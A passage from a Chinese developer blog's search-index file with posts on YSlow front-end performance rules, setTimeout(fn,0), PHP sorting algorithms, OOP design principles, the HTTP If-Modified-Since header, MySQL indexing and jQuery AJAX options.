例如，当我们要访问https://baidu.com时，实际上返回的是一个包含301代码的跳转，它指向的是http://baidu.com/（注意末尾的斜杠）。在nginx服务器可以使用rewrite；Apache服务器中可以使用Alias 或者 mod_rewrite或者the DirectorySlash来避免。另一种是不用域名之间的跳转， 比如访问http://baidu.com/bbs跳转到http://bbs.baidu.com/。那么可以通过使用Alias或者mod_rewirte建立CNAME（保存一个域名和另外一个域名之间关系的DNS记录）来替代。 删除重复的JS和CSS重复调用脚本，除了增加额外的HTTP请求外，多次运算也会浪费时间。在IE和Firefox中不管脚本是否可缓存，它们都存在重复运算JavaScript的问题。 配置ETags它用来判断浏览器缓存里的元素是否和原来服务器上的一致。比last-modified date更具有弹性，例如某个文件在1秒内修改了10次，Etag可以综合Inode(文件的索引节点(inode)数)，MTime(修改时间)和Size来精准的进行判断，避开UNIX记录MTime只能精确到秒的问题。 服务器集群使用，可取后两个参数。使用ETags减少Web应用带宽和负载 可缓存的AJAX异步请求同样的造成用户等待，所以使用ajax请求时，要主动告诉浏览器如果该请求有缓存就去请求缓存内容。如下代码片段, cache:true 就是显式的要求如果当前请求有缓存的话，直接使用缓存 1234567$.ajax(&#123; url : 'url', dataType : "json", cache: true, success : function(son, status)&#123; &#125;) 使用GET来完成AJAX请求当使用XMLHttpRequest时，浏览器中的POST方法是一个“两步走”的过程：首先发送文件头，然后才发送数据。因此使用GET获取数据时更加有意义。 减少DOM元素数量这是一门大学问，这里可以引申出一堆优化的细节。想要具体研究的可以看后面推荐书籍。总之大原则减少DOM数量，就会减少浏览器的解析负担。 避免404比如外链的css、js文件出现问题返回404时，会破坏浏览器的并行加载。 减少Cookie的大小Cookie里面别塞那么多东西，因为每个请求都得带着他跑。 使用无cookie的域比如CSS、js、图片等，客户端请求静态文件的时候，减少了 Cookie 的反复传输对主域名的影响。 不要使用滤镜IE独有属性AlphaImageLoader用于修正7.0以下版本中显示PNG图片的半透明效果。这个滤镜的问题在于浏览器加载图片时它会终止内容的呈现并且冻结浏览器。在每一个元素（不仅仅是图片）它都会运算一次，增加了内存开支，因此它的问题是多方面的。 完全避免使用AlphaImageLoader的最好方法就是使用PNG8格式来代替，这种格式能在IE中很好地工作。如果你确实需要使用AlphaImageLoader，请使用下划线_filter又使之对IE7以上版本的用户无效。 不要在HTML中缩放图片比如你需要的图片尺寸是50* 50 那就不用用一张500*500的大尺寸图片，影响加载 缩小favicon.ico并缓存以上是Yslow的23个优化原则]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[setTimeout(call,0)作用]]></title>
    <url>%2Farticles%2FsetTimeout-call-0-%E4%BD%9C%E7%94%A8%2F</url>
    <content type="text"><![CDATA[经常看到setTimeout延时0ms的javascript代码，感到很迷惑，难道延时0ms和不延时不是一个道理吗？后来通过查资料以及实验得出以下两个作用，可能还有作用我还不知道，希望得知的朋友在后面评论上不吝指出。 1. 实现javascript的异步正常情况下javascript都是按照顺序执行的。但是我们可能让该语句后面的语句执行完再执行本身，这时就可以用到setTimeout延时0ms来实现了。 如： 123456alert(1);setTimeout("alert(2)", 0);alert(3); 虽然延时了0ms,但是执行顺序为：1，3，2 这样就保证setTimeout里面的语句在某一代码段中最后执行。 2. 在事件中，setTimeout 会在其完成当前任何延宕事件的事件处理器的执行，以及完成文档当前状态更新后，告诉浏览器去启用 setTimeout 内注册的函数。举个例子来说这句话的意思，假如当某个事件在页面上建立一个文本框，并给文本框赋值（完成文档当前状态更新），然后将焦点定到文本框，并且选中文本框的内容（后面部分就需要用到setTimeout 延迟0ms实现，否则不好实现）。 先看个例子： &lt;html lang="en"&gt; &lt;head&gt; &lt;title&gt;setTimeout(call,0) demo&lt;/title&gt; &lt;/head&gt; &lt;script type="text/javascript" &gt; (function(){ function get(id){ return document.getElementById(id); } window.onload = function(){ get('makeinput').onmousedown = function(){ var input = document.createElement('input'); input.setAttribute('type', 'text'); input.setAttribute('value', 'test1'); get('inpwrapper').appendChild(input); input.focus(); input.select(); get('makeinput2').onmousedown = function(){ var input = document.createElement('input'); input.setAttribute('type', 'text'); input.setAttribute('value', 'test1'); get('inpwrapper2').appendChild(input); setTimeout(function(){ input.focus(); input.select(); }, 0); get('input1').onkeypress = function(){ get('preview1').innerHTML = this.value; get('input2').onkeypress = function(){ setTimeout(function(){ get('preview2').innerHTML = get('input2').value; },0 ); } } })(); &lt;/script&gt; &lt;body&gt; &lt;h1&gt;&lt;code&gt;DEMO1&lt;/code&gt;&lt;/h1&gt; &lt;h2&gt;1、未使用 &lt;code&gt;setTimeout&lt;/code&gt;（未选中文本框内容）&lt;/h2&gt; &lt;button id="makeinput"&gt;生成 input&lt;/button&gt; &lt;p id="inpwrapper"&gt;&lt;/p&gt; &lt;h2&gt;2、使用 &lt;code&gt;setTimeout&lt;/code&gt;（立即选中文本框内容）&lt;/h2&gt; &lt;button id="makeinput2"&gt;生成 input&lt;/button&gt;&lt;/h2&gt; &lt;p id="inpwrapper2"&gt;&lt;/p&gt; -------------------------------------------------------------------------- &lt;h1&gt;&lt;code&gt;DEMO2&lt;/code&gt;&lt;/h1&gt; &lt;h2&gt;1、未使用 &lt;code&gt;setTimeout&lt;/code&gt;(只有输入第二个字符时，前一个字符才显示出来)&lt;/h2&gt; &lt;input type="text" id="input1" value=""/&gt;&lt;div id="preview1"&gt;&lt;/div&gt; &lt;h2&gt;2、使用 &lt;code&gt;setTimeout&lt;/code&gt;(输入时，字符同时显示出来)&lt;/h2&gt; &lt;input type="text" id="input2" value=""/&gt;&lt;div id="preview2"&gt;&lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 3. 总结现有的 JavaScript 引擎是单线程处理任务的。它把任务放到队列中，不会同步去执行，必须在完成一个任务后才开始另外一个任务。其实，这是一个把需要执行的任务从队列中跳脱的技巧。在DEMO1中，JavaScript 引擎在执行 onmousedown时，由于没有多线程的同步执行，不可能同时去处理刚创建元素的 focus 和 select 方法，由于这两个方法都不在队列中，在完成 onmousedown 后，JavaScript 引擎已经丢弃了这两个任务，正如第一种情况。而在第二种情况中，由于setTimeout可以把任务从某个队列中跳脱成为新队列，因而能够得到期望的结果。]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
      <tags>
        <tag>javascript异步</tag>
        <tag>setTimeout</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP实现四种基本排序算法]]></title>
    <url>%2Farticles%2FPHP%E5%AE%9E%E7%8E%B0%E5%9B%9B%E7%A7%8D%E5%9F%BA%E6%9C%AC%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[Q：分别用冒泡排序法，快速排序法，选择排序法，插入排序法将下面数组中的值按照从小到大的顺序进行排序。1$arr = array(1,43,54,62,21,66,32,78,36,76,39); 冒泡排序思路分析：在要排序的一组数中，对当前还未排好的序列，从前往后对相邻的两个数依次进行比较和调整，让较大的数往下沉，较小的往上冒。即，每当两相邻的数比较后发现它们的排序与排序要求相反时，就将它们互换。 代码实现： 12345678910111213141516function bubbleSort($arr)&#123; $len = count($arr); // 该层循环控制 需要冒泡的轮数 for ($i = 1; $i &lt; $len; $i++) &#123; // 该层循环用来控制每轮 冒出一个数 需要比较的次数 for ($k = 0; $k &lt; $len - $i; $k++) &#123; if ($arr[$k] &gt; $arr[$k + 1]) &#123; $tmp = $arr[$k + 1]; $arr[$k + 1] = $arr[$k]; $arr[$k] = $tmp; &#125; &#125; &#125; return $arr;&#125; 选择排序思路分析：在要排序的一组数中，选出最小的一个数与第一个位置的数交换。然后在剩下的数当中再找最小的与第二个位置的数交换，如此循环到倒数第二个数和最后一个数比较为止。 代码实现： 123456789101112131415161718192021222324function selectSort($arr)&#123; //双重循环完成，外层控制轮数，内层控制比较次数 $len = count($arr); for ($i = 0; $i &lt; $len - 1; $i++) &#123; //先假设最小的值的位置 $p = $i; for ($j = $i + 1; $j &lt; $len; $j++) &#123; //$arr[$p] 是当前已知的最小值 if ($arr[$p] &gt; $arr[$j]) &#123; //比较，发现更小的,记录下最小值的位置；并且在下次比较时采用已知的最小值进行比较。 $p = $j; &#125; &#125; //已经确定了当前的最小值的位置，保存到$p中。如果发现最小值的位置与当前假设的位置$i不同，则位置互换即可。 if ($p != $i) &#123; $tmp = $arr[$p]; $arr[$p] = $arr[$i]; $arr[$i] = $tmp; &#125; &#125; //返回最终结果 return $arr;&#125; 插入排序思路分析：在要排序的一组数中，假设前面的数已经是排好顺序的，现在要把第n个数插到前面的有序数中，使得这n个数也是排好顺序的。如此反复循环，直到全部排好顺序。 代码实现： 12345678910111213141516171819function insertSort($arr)&#123; $len = count($arr); for ($i=1; $i&lt;$len; $i++) &#123; $tmp = $arr[$i]; //内层循环控制，比较并插入 for ($j = $i - 1; $j &gt;= 0; $j--) &#123; if ($tmp &lt; $arr[$j]) &#123; //发现插入的元素要小，交换位置，将后边的元素与前面的元素互换 $arr[$j + 1] = $arr[$j]; $arr[$j] = $tmp; &#125; else &#123; //如果碰到不需要移动的元素，由于是已经排序好是数组，则前面的就不需要再次比较了。 break; &#125; &#125; &#125; return $arr;&#125; 快速排序思路分析：选择一个基准元素，通常选择第一个元素或者最后一个元素。通过一趟扫描，将待排序列分成两部分，一部分比基准元素小，一部分大于等于基准元素。此时基准元素在其排好序后的正确位置，然后再用同样的方法递归地排序划分的两部分。 代码实现： 12345678910111213141516171819202122232425262728293031323334function quickSort($arr)&#123; //先判断是否需要继续进行 $length = count($arr); if ($length &lt;= 1) &#123; return $arr; &#125; //选择第一个元素作为基准 $base_num = $arr[0]; //遍历除了标尺外的所有元素，按照大小关系放入两个数组内 //初始化两个数组 $left_array = array(); //小于基准的 $right_array = array(); //大于基准的 for ($i = 1; $i &lt; $length; $i++) &#123; if ($base_num &gt; $arr[$i]) &#123; //放入左边数组 $left_array[] = $arr[$i]; &#125; else &#123; //放入右边 $right_array[] = $arr[$i]; &#125; &#125; //再分别对左边和右边的数组进行相同的排序处理方式递归调用这个函数 $left_array = quickSort($left_array); $right_array = quickSort($right_array); //合并 return array_merge($left_array, array($base_num), $right_array);&#125;]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[什么是OOP]]></title>
    <url>%2Farticles%2F%E4%BB%80%E4%B9%88%E6%98%AFOOP%2F</url>
    <content type="text"><![CDATA[面向对象是相对于面向过程而言的。面向过程语言是一种基于功能分析的、以算法为中心的程序设计方法；而面向对象是一种基于结构分析的、以数据为中心的程序设计思想。早在面向过程语言时代，有一句话说：程序=算法+数据结构。而现在在面向对象语言时代，这句话变为：程序= 对象+消息。对象：万物皆对象； 消息：指对象之间的相互通信。在面向对象语言中有一个有很重要东西，叫做类。从面向过程的角度看，类就是一个特殊的数据结构，它就好像是我们C语言中的结构体;从面向对象的角度看，类就是具有相同属性和方法的对象的集合。 面向对象有三大特性：封装、继承、多态。 封装 所谓封装,就是指隐藏对象的实现细节，给外界提供公共的方法来访问。 这一点，我个人认为和面向过程语言有本质的区别。在C语言中，我们必须在乎每一个实现细节，去关注每一个过程； 而自从从在面向对象语言中提出了封装这个概念后，我们就可以不必要去关心每一个对象的实现细节， 我们只要关注我们所要实现的功能就行，然后根据给我们提供好的接口，我们去面向接口编程就行了。 面向对象的封装思想，我认为应用的最好、最成功的地方，就是在微软的.NET技术上.微软把很多经常用到的功能都封装在一个控件里，作为我们用户不必去在意到底这个控件是用什么实现的，它内部到底是怎么样的？我们只需要关心我们需要实现的功能就行， 然后根据控件给我们提供的属性和方法去操作这些控件，实现我们想要的功能就行了。 继承 面向对象的继承和生物学的继承很相似。子类可以继承父类的公共属性和方法，子类永远没法继承到父类的私有属性和方法。这一点还区别于生物学的继承，生物学中子类可以同时继承父亲和母亲。但是在 java|C#|C++ 等面向对象语言中，是不允许多重继承的，但可以多层继承。 为了弥补不能多重继承这点，在java和c#语言中都提出了接口这一概念。接口就是一种规范。它同样不会有实现细节，而只是给那些要实现这个接口的类一个规范和约束，约束那些实现这些接口的类，要实现我提供的功能，就必须实现我的所有方法， 要不你就声明为抽象类。 多态 多态，就是同一个实现接口，对不同的实例而执行不同的操作。这一点，可以理解为遗传学的变异。 同一个物种的后代由于基因突变或自然环境等影响，而造成不同的个体差异。而我们这里的多态也一样，同属一个基类的不同派生类也可以有自己不同于其他类的属性和方法。 除了这封装、继承、多态这三点基本特征外，面向对象还有一个很重要的概念，叫抽象。抽象就是把提取事物的本质东西，而忽视非本质的东西。对应于抽象这一概念，java和c#中都有一个类叫做抽象类。抽象类中可以给出方法的实现细节，同接口一样如果你要实现我这个抽象类就必须实现我的所有方法，要不你就声明你为抽象类。如果不允许抽象类中有方法的实现细节，这就变成了接口。 总之，面向对象就是万物皆对象，把客观事物当成一个对象来处理的程序设计思想。是一种区别于POP、SOA、面向组件等其他程序设计思想，是一种基于结构分析的，以数据为中心的程序设计思想。 OOP几大设计模式遵循的一般原则： 1.开-闭原则(Open-Closed Principle, OCP) 一个软件实体应当对扩展开发,对修改关闭.说的是,再设计一个模块的时候,应当使这个模块可以在不被修改的前提下被扩展.换言之,应当可以在不必修改源代码的情况下改变这个模块的行为，在保持系统一定稳定性的基础上，对系统进行扩展。这是面向对象设计（OOD）的基石，也是最重要的原则。 2.里氏代换原则(Liskov Substitution Principle,常缩写为.LSP) 由Barbar Liskov(芭芭拉.里氏)提出，是继承复用的基石。 严格表达:如果每一个类型为T1的对象o1,都有类型为T2的对象o2,使得以T1定义的所有程序P在所有的对象o1都代换称o2时,程序P的行为没有变化,那么类型T2是类型T1的子类型. 换言之,一个软件实体如果使用的是一个基类的话,那么一定适用于其子类,而且它根本不能察觉出基类对象和子类对象的区别.只有衍生类可以替换基类，软件单位的功能才能不受影响，基类才能真正被复用，而衍生类也能够在基类的基础上增加新功能。 反过来的代换不成立 &lt;墨子.小取&gt;中说:”白马,马也; 乘白马,乘马也.骊马(黑马),马也;乘骊马,乘马也.” 该类西方著名的例程为:正方形是否是长方形的子类(答案是”否”)。类似的还有椭圆和圆的关系。 应当尽量从抽象类继承,而不从具体类继承,一般而言,如果有两个具体类A,B有继承关系,那么一个最简单的修改方案是建立一个抽象类C,然后让类A和B成为抽象类C的子类.即如果有一个由继承关系形成的登记结构的话,那么在等级结构的树形图上面所有的树叶节点都应当是具体类;而所有的树枝节点都应当是抽象类或者接口. “基于契约设计(Design By Constract),简称DBC”这项技术对LISKOV代换原则提供了支持.该项技术Bertrand Meyer伯特兰做过详细的介绍: 使用DBC,类的编写者显式地规定针对该类的契约.客户代码的编写者可以通过该契约获悉可以依赖的行为方式.契约是通过每个方法声明的前置条件(preconditions)和后置条件(postconditions)来指定的.要使一个方法得以执行,前置条件必须为真.执行完毕后,该方法要保证后置条件为真.就是说,在重新声明派生类中的例程(routine)时,只能使用相等或者更弱的前置条件来替换原始的前置条件,只能使用相等或者更强的后置条件来替换原始的后置条件. 3.依赖倒置原则(Dependence Inversion Principle) 要求客户端依赖于抽象耦合. 表述: 抽象不应当依赖于细节,细节应当依赖于抽象.(Program to an interface, not an implementaction) 表述二: 针对接口编程的意思是说,应当使用接口和抽象类进行变量的类型声明,参量的类型声明,方法的返还类型声明,以及数据类型的转换等.不要针对实现编程的意思就是说,不应当使用具体类进行变量的类型声明,参量类型声明,方法的返还类型声明,以及数据类型的转换等.要保证做到这一点,一个具体的类应等只实现接口和抽象类中声明过的方法,而不应当给出多余的方法.只要一个被引用的对象存在抽象类型,就应当在任何引用此对象的地方使用抽象类型,包括参量的类型声明,方法返还类型的声明,属性变量的类型声明等. 接口与抽象的区别就在于抽象类可以提供某些方法的部分实现,而接口则不可以,这也大概是抽象类唯一的优点.如果向一个抽象类加入一个新的具体方法,那么所有的子类型一下子就都得到得到了这个新的具体方法,而接口做不到这一点.如果向一个接口加入了一个新的方法的话,所有实现这个接口的类就全部不能通过编译了,因为它们都没有实现这个新声明的方法.这显然是接口的一个缺点. 一个抽象类的实现只能由这个抽象类的子类给出,也就是说,这个实现处在抽象类所定义出的继承的登记结构中,而由于一般语言都限制一个类只能从最多一个超类继承,因此将抽象作为类型定义工具的效能大打折扣.反过来,看接口,就会发现任何一个实现了一个接口所规定的方法的类都可以具有这个接口的类型,而一个类可以实现任意多个接口. 从代码重构的角度上讲,将一个单独的具体类重构成一个接口的实现是很容易的,只需要声明一个接口,并将重要的方法添加到接口声明中,然后在具体类定义语句中加上保留字以继承于该接口就行了.而作为一个已有的具体类添加一个抽象类作为抽象类型不那么容易,因为这个具体类有可能已经有一个超类.这样一来,这个新定义的抽象类只好继续向上移动,变成这个超类的超类,如此循环,最后这个新的抽象类必定处于整个类型等级结构的最上端,从而使登记结构中的所有成员都会受到影响. 接口是定义混合类型的理想工具,所为混合类型,就是在一个类的主类型之外的次要类型.一个混合类型表明一个类不仅仅具有某个主类型的行为,而且具有其他的次要行为. 联合使用接口和抽象类:由于抽象类具有提供缺省实现的优点,而接口具有其他所有优点,所以联合使用两者就是一个很好的选择. 首先,声明类型的工作仍然接口承担的,但是同时给出的还有一个抽象类,为这个接口给出一个缺省实现.其他同属于这个抽象类型的具体类可以选择实现这个接口,也可以选择继承自这个抽象类.如果一个具体类直接实现这个接口的话,它就必须自行实现所有的接口;相反,如果它继承自抽象类的话,它可以省去一些不必要的的方法,因为它可以从抽象类中自动得到这些方法的缺省实现;如果需要向接口加入一个新的方法的话,那么只要同时向这个抽象类加入这个方法的一个具体实现就可以了,因为所有继承自这个抽象类的子类都会从这个抽象类得到这个具体方法.这其实就是缺省适配器模式(Defaule Adapter). 什么是高层策略呢?它是应用背后的抽象,是那些不随具体细节的改变而改变的真理. 它是系统内部的隐喻. 4.接口隔离原则 (Interface Segregation Principle, ISP) 一个类对另外一个类的依赖是建立在最小的接口上。 使用多个专门的接口比使用单一的总接口要好.根据客户需要的不同,而为不同的客户端提供不同的服务是一种应当得到鼓励的做法.就像”看人下菜碟”一样,要看客人是谁,再提供不同档次的饭菜. 胖接口会导致他们的客户程序之间产生不正常的并且有害的耦合关系.当一个客户程序要求该胖接口进行一个改动时,会影响到所有其他的客户程序.因此客户程序应该仅仅依赖他们实际需要调用的方法. 5.合成/聚合复用原则(Composite/Aggregate Reuse Principle,CARP) 在一个新的对象里面使用一些已有的对象,使之成为新对象的一部分;新的对象通过这些向对象的委派达到复用已有功能的目的.这个设计原则有另一个简短的表述:要尽量使用合成/聚合,尽量不要使用继承. 6.迪米特法则(Law of Demeter LoD)又叫做最少知识原则(Least Knowledge Principle,LKP) 就是说,一个对象应当对其他对象有尽可能少的了了解. 迪米特法则最初是用来作为面向对象的系统设计风格的一种法则,与1987年秋天由Ian Holland在美国东北大学为一个叫做迪米特(Demeter)的项目设计提出的,因此叫做迪米特法则[LIEB89][LIEB86].这条法则实际上是很多著名系统,比如火星登陆软件系统,木星的欧罗巴卫星轨道飞船的软件系统的指导设计原则. 没有任何一个其他的OO设计原则象迪米特法则这样有如此之多的表述方式,如下几种: 只与你直接的朋友们通信(Only talk to your immediate friends) 不要跟”陌生人”说话(Don’t talk to strangers) 每一个软件单位对其他的单位都只有最少的知识,而且局限于那些本单位密切相关的软件单位. 就是说,如果两个类不必彼此直接通信,那么这两个类就不应当发生直接的相互作用,如果其中的一个类需要调用另一个类的某一个方法的话,可以通过第三者转发这个调用。 7.单一职责原则(Simple responsibility pinciple SRP) 就一个类而言,应该仅有一个引起它变化的原因,如果你能想到多于一个的动机去改变一个类,那么这个类就具有多于一个的职责.应该把多于的指责分离出去,分别再创建一些类来完成每一个职责. 常说的OO五大原则就是指其中的 ： 1、单一职责原则； 2、开放闭合原则； 3、里氏替换原则； 4、依赖倒置原则； 5、接口隔离原则。]]></content>
  </entry>
  <entry>
    <title><![CDATA[HTTP的请求头标签 If-Modified-Since]]></title>
    <url>%2Farticles%2FHTTP%E7%9A%84%E8%AF%B7%E6%B1%82%E5%A4%B4%E6%A0%87%E7%AD%BE-If-Modified-Since%2F</url>
    <content type="text"><![CDATA[大家都知道客户端浏览器是有缓存的，里面存放之前访问过的一些网页文件。例如IE，会把缓存文件存到“C:\Documents and Settings\用户名\Local Settings\Temporary Internet Files”这样类似的目录里。其实缓存里存储的不只是网页文件，还有服务器发过来的该文件的最后服务器修改时间。 If-Modified-Since是标准的HTTP请求头标签，在发送HTTP请求时，把浏览器端缓存页面的最后修改时间一起发到服务器去，服务器会把这个时间与服务器上实际文件的最后修改时间进行比较: 如果时间一致，那么返回HTTP状态码304（不返回文件内容），客户端接到之后，就直接把本地缓存文件显示到浏览器中。 如果时间不一致，就返回HTTP状态码200和新的文件内容，客户端接到之后，会丢弃旧文件，把新文件缓存起来，并显示到浏览器中。 下面用一个简单的小例子说明一下。 由于演示例子需要截取HTTP Request和Response的信息，我在这里使用的工具是Fiddler(点击下载)。 1.首先在服务器创建一个简单的HTML文件，用浏览器访问一下，成功表示HTML页面。Fiddler就会产生下面的捕获信息。 需要留意的是 （1）因为是第一次访问该页面，客户端发请求时，请求头中没有If-Modified-Since标签。 （2）服务器返回的HTTP状态码是200，并发送页面的全部内容。 （3）服务器返回的HTTP头标签中有Last-Modified，告诉客户端页面的最后修改时间。 2.在浏览器中刷新一下页面，Fiddler就会产生下面的捕获信息。 需要注意的是 （1）客户端发HTTP请求时，使用If-Modified-Since标签，把上次服务器告诉它的文件最后修改时间返回到服务器端了。 （2）因为文件没有改动过，所以服务器返回的HTTP状态码是304，没有发送页面的内容。 3.用文本编辑器稍微改动一下页面文件，保存。再用浏览器访问一下，Fiddler就会产生下面的捕获信息。 需要留意的是 （1）客户端发HTTP请求时，使用If-Modified-Since标签，把上次服务器告诉它的文件最后修改时间返回到服务器端了。 （2）因为文件被改动过，两边时间不一致，所以服务器返回的HTTP状态码是200，并发送新页面的全部内容。 （3）服务器返回的HTTP头标签中有Last-Modified，告诉客户端页面的新的最后修改时间。 HTTP的If-Modified-Since头标签与客户端缓存相互配合，大大节约了网络流量。]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[mysql优化]]></title>
    <url>%2Farticles%2Fmysql%E4%BC%98%E5%8C%96%2F</url>
    <content type="text"><![CDATA[创建索引对于查询占主要的应用来说，索引显得尤为重要。很多时候性能问题很简单的就是因为我们忘了添加索引而造成的，或者说没有添加更为有效的索引导致。如果不加索引的话，那么查找任何哪怕只是一条特定的数据都会进行一次全表扫描，如果一张表的数据量很大而符合条件的结果又很少，那么不加索引会引起致命的性能下降。但是也不是什么情况都非得建索引不可，比如性别可能就只有两个值，建索引不仅没什么优势，还会影响到更新速度，这被称为过度索引。 复合索引比如有一条语句是这样的：select * from users where area=&#39;beijing&#39; and age=22 如果我们是在area和age上分别创建单个索引的话，由于mysql查询每次只能使用一个索引，所以虽然这样已经相对不做索引时全表扫描提高了很多效率，但是如果在area、age两列上创建复合索引的话将带来更高的效率。如果我们创建了(area, age, salary)的复合索引，那么其实相当于创建了(area,age,salary)、(area,age)、(area)三个索引，这被称为最佳左前缀特性。因此我们在创建复合索引时应该将最常用 作限制条件的列放在最左边，依次递减。 索引不会包含有NULL值的列只要列中包含有NULL值都将不会被包含在索引中，复合索引中只要有一列含有NULL值，那么这一列对于此复合索引就是无效的。所以我们在数据库设计时不要让字段的默认值为NULL。 使用短索引对串列进行索引，如果可能应该指定一个前缀长度。例如，如果有一个CHAR(255)的 列，如果在前10 个或20 个字符内，多数值是惟一的，那么就不要对整个列进行索引。短索引不仅可以提高查询速度而且可以节省磁盘空间和I/O操作。 排序的索引问题mysql查询只使用一个索引，因此如果where子句中已经使用了索引的话，那么order by中的列是不会使用索引的。因此数据库默认排序可以符合要求的情况下不要使用排序操作；尽量不要包含多个列的排序，如果需要最好给这些列创建复合索引。 like语句操作一般情况下不鼓励使用like操作，如果非使用不可，如何使用也是一个问题。like “%aaa%” 不会使用索引而like “aaa%”可以使用索引。 不要在列上进行运算select * from users where YEAR(adddate)&lt;2007 将在每个行上进行运算，这将导致索引失效而进行全表扫描，因此我们可以改成 select * from users where adddate &lt; &#39;2007-01-01&#39; 8、不使用NOT IN和&lt;&gt;操作 NOT IN和&lt;&gt;操作都不会使用索引将进行全表扫描。NOT IN可以NOT EXISTS代替，id&lt;&gt;3则可使用id&gt;3 or id&lt;3来代替。]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Ajax使用详解]]></title>
    <url>%2Farticles%2FAjax%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[jQuery使用详解 1234567891011121314151617181920212223242526$.ajax(&#123; type: "POST", // 请求方式 contentType: "application/x-www-form-urlencoded", // Body编码 dataType: "html",// 预期服务器返回的数据类型 async: true,// 异步请求，同步的话改成false url: "http://www.*****.com", // 请求地址 timeout:30000, // 超时 success: (data) =&gt; &#123; // 请求成功 alert(data); &#125;, error: (XMLHttpRequest, textStatus, errorThrown) =&gt; &#123; // 请求失败 alert(errorThrown); &#125; complete: (XMLHttpRequest, ts) =&gt; &#123; // 请求完成（不管成功还是失败） alert(ts); &#125;&#125;); 参数 options 类型：Object 可选。AJAX 请求设置。所有选项都是可选的。 async 类型：Boolean 默认值: true。默认设置下，所有请求均为异步请求。如果需要发送同步请求，请将此选项设置为 false。 注意，同步请求将锁住浏览器，用户其它操作必须等待请求完成才可以执行。 beforeSend(XHR) 类型：Function 发送请求前可修改 XMLHttpRequest 对象的函数，如添加自定义 HTTP 头。 XMLHttpRequest 对象是唯一的参数。 这是一个 Ajax 事件。如果返回 false 可以取消本次 ajax 请求。 cache 类型：Boolean 默认值: true，dataType 为 script 和 jsonp 时默认为 false。设置为 false 将不缓存此页面。 jQuery 1.2 新功能。 complete(XHR, TS) 类型：Function 请求完成后回调函数 (请求成功或失败之后均调用)。 参数： XMLHttpRequest 对象和一个描述请求类型的字符串。 这是一个 Ajax 事件。 contentType 类型：String 默认值: “application/x-www-form-urlencoded”。发送信息至服务器时内容编码类型。 默认值适合大多数情况。如果你明确地传递了一个 content-type 给 $.ajax() 那么它必定会发送给服务器（即使没有数据要发送）。 context 类型：Object 这个对象用于设置 Ajax 相关回调函数的上下文。也就是说，让回调函数内 this 指向这个对象（如果不设定这个参数，那么 this 就指向调用本次 AJAX 请求时传递的 options 参数）。比如指定一个 DOM 元素作为 context 参数，这样就设置了 success 回调函数的上下文为这个 DOM 元素。 就像这样： 123$.ajax(&#123; url: "test.html", context: document.body, success: function()&#123; $(this).addClass("done");&#125;&#125;); data 类型：String 发送到服务器的数据。将自动转换为请求字符串格式。GET 请求中将附加在 URL 后。查看 processData 选项说明以禁止此自动转换。必须为 Key/Value 格式。如果为数组，jQuery 将自动为不同值对应同一个名称。如 {foo:[“bar1”, “bar2”]} 转换为 ‘&amp;foo=bar1&amp;foo=bar2’。 dataFilter 类型：Function 给 Ajax 返回的原始数据的进行预处理的函数。提供 data 和 type 两个参数：data 是 Ajax 返回的原始数据，type 是调用 jQuery.ajax 时提供的 dataType 参数。函数返回的值将由 jQuery 进一步处理。 dataType 类型：String 预期服务器返回的数据类型。如果不指定，jQuery 将自动根据 HTTP 包 MIME 信息来智能判断，比如 XML MIME 类型就被识别为 XML。在 1.4 中，JSON 就会生成一个 JavaScript 对象，而 script 则会执行这个脚本。随后服务器端返回的数据会根据这个值解析后，传递给回调函数。可用值: xml: 返回 XML 文档，可用 jQuery 处理。 html: 返回纯文本 HTML 信息；包含的 script 标签会在插入 dom 时执行。 script: 返回纯文本 JavaScript 代码。不会自动缓存结果。除非设置了 “cache” 参数。注意：在远程请求时(不在同一个域下)，所有POST 请求都将转为 GET 请求。（因为将使用 DOM 的 script标签来加载） json: 返回 JSON 数据 。 jsonp: JSONP 格式。使用 JSONP 形式调用函数时，如 “myurl?callback=?” jQuery 将自动替换 ? 为正确的函数名，以执行回调函数。 text: 返回纯文本字符串 error 类型：Function 默认值: 自动判断 (xml 或 html)。请求失败时调用此函数。 有以下三个参数：XMLHttpRequest 对象、错误信息、（可选）捕获的异常对象。 如果发生了错误，错误信息（第二个参数）除了得到 null 之外，还可能是 “timeout”, “error”, “notmodified” 和 “parsererror”。这是一个 Ajax 事件。 global 类型：Boolean 是否触发全局 AJAX 事件。默认值: true。设置为 false 将不会触发全局 AJAX 事件，如 ajaxStart 或 ajaxStop 可用于控制不同的 Ajax 事件。 ifModified 类型：Boolean 仅在服务器数据改变时获取新数据。默认值: false。使用 HTTP 包 Last-Modified 头信息判断。在 jQuery 1.4 中，它也会检查服务器指定的 ‘etag’ 来确定数据没有被修改过。 jsonp 类型：String 在一个 jsonp 请求中重写回调函数的名字。这个值用来替代在 “callback=?” 这种 GET 或 POST 请求中 URL 参数里的 “callback” 部分，比如 {jsonp:’onJsonPLoad’} 会导致将 “onJsonPLoad=?” 传给服务器。 jsonpCallback 类型：String 为 jsonp 请求指定一个回调函数名。这个值将用来取代 jQuery 自动生成的随机函数名。这主要用来让 jQuery 生成度独特的函数名，这样管理请求更容易，也能方便地提供回调函数和错误处理。你也可以在想让浏览器缓存 GET 请求的时候，指定这个回调函数名。 password 类型：String 用于响应 HTTP 访问认证请求的密码 processData 类型：Boolean 默认值: true。默认情况下，通过data选项传递进来的数据，如果是一个对象(技术上讲只要不是字符串)，都会处理转化成一个查询字符串，以配合默认内容类型 “application/x-www-form-urlencoded”。如果要发送 DOM 树信息或其它不希望转换的信息，请设置为 false。 scriptCharset 类型：String 只有当请求时 dataType 为 “jsonp” 或 “script”，并且 type 是 “GET” 才会用于强制修改 charset。通常只在本地和远程的内容编码不同时使用。 success 类型：Function 请求成功后的回调函数。 参数：由服务器返回，并根据 dataType 参数进行处理后的数据；描述状态的字符串。 这是一个 Ajax 事件。 traditional 类型：Boolean 如果你想要用传统的方式来序列化数据，那么就设置为 true。请参考工具分类下面的 